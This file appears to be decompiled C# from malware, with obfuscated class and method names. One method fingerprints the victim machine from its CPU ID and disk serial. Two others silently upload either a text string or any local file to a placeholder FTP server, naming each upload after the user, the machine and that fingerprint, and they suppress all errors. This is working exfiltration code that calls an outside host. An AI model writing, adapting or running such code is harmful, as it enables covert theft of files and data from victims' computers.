using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace VsYjhNTIRPBh;

internal sealed class fRNtfJxgwGHJ
{
	public static string jrXTCKQXCBuGd()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = "C";
		ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		return text3 + text;
	}

	public static void BoxBzoXnkhGOzBWI(string cHAwgpOMjNOrgW = "URL", string ulOTDMBkiJkfI = "USERNAME", string RnVTZoTMKOpM = "ACCESO", string AIxBSlzPkOSROPl = "")
	{
		try
		{
			string text = jrXTCKQXCBuGd();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(cHAwgpOMjNOrgW + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(ulOTDMBkiJkfI, RnVTZoTMKOpM);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(AIxBSlzPkOSROPl);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void kmufixlgVkgi(string XdqfaVKvMGlSBN = "URL", string EpDImsPYRvFHP = "USERNAME", string Teqnwcktxpe = "ACCESO", string zEBpGWuZCQT = "")
	{
		try
		{
			string text = jrXTCKQXCBuGd();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(XdqfaVKvMGlSBN + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + "_" + Path.GetFileName(zEBpGWuZCQT));
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(EpDImsPYRvFHP, Teqnwcktxpe);
			byte[] array = File.ReadAllBytes(zEBpGWuZCQT);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}
}
